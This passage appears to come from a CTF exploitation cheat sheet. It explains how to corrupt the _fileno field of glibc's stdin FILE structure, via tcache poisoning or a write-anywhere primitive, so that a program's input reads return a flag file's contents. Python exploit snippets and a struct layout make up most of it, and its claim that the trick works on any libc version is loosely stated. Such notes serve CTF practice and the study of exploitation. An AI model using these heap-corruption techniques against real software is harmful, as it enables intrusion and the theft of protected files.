...
## stdin/stdout fileno Redirect via FILE* Corruption

**Pattern:** `_IO_2_1_stdin_` (and `_IO_2_1_stdout_`) has a `_fileno` field at offset `+0x70`. It holds the actual file descriptor the stream reads from. Overwriting it redirects `scanf`/`fgets`/`read` on stdin to any already-open fd — including one the kernel opened for you (e.g., a flag file).

**Layout reference:**
```c
// FILE struct (simplified, glibc 2.27–2.35)
struct _IO_FILE {
    int _flags;          // +0x00
    char *_IO_read_ptr;  // +0x08
    // ... buffering fields ...
    int _fileno;         // +0x70  ← overwrite this
    // ...
};
// _IO_2_1_stdin_ is at a fixed libc offset; calculate via libc.sym['_IO_2_1_stdin_']
stdin_fileno_addr = libc.sym['_IO_2_1_stdin_'] + 0x70
```

**Exploit via tcache poisoning (libc ≤ 2.29, no safe-linking):**
```python
# Goal: make stdin read from fd=flag_fd instead of fd=0
flag_fd = 666   # some fd that was opened for the flag

# Leak heap + libc via normal double-free or unsorted-bin trick
# Then poison tcache to allocate at stdin._fileno
edit(2, p64(libc.sym['_IO_2_1_stdin_'] + 112))   # 112 = 0x70
create('/bin/sh\x00')   # dummy alloc
create('/bin/sh\x00')   # dummy alloc
create(p64(flag_fd))    # writes flag_fd into stdin._fileno

# Now scanf/fgets reads from fd=flag_fd — flag appears as next "input"
p.sendlineafter('>', '4')    # trigger a read operation
flag = p.recvuntil('\n')
```

**Alternative: direct write primitive to `_fileno`:**
```python
# If you have write-anywhere (e.g., format string, OOB write):
target = libc.sym['_IO_2_1_stdin_'] + 0x70   # _fileno field
write_4bytes(target, flag_fd)
# Next scanf call reads from flag_fd
```

**Key insight:** No shell or ROP needed — just a write-anywhere primitive and knowledge of the flag's fd. The flag fd is often 3, 4, or 5 in CTF containers (after stdin=0, stdout=1, stderr=2). Brute-force the fd if unknown: try small integers 3–20. Works on any libc version since `_IO_2_1_stdin_._fileno` has been at `+0x70` since glibc 2.x.
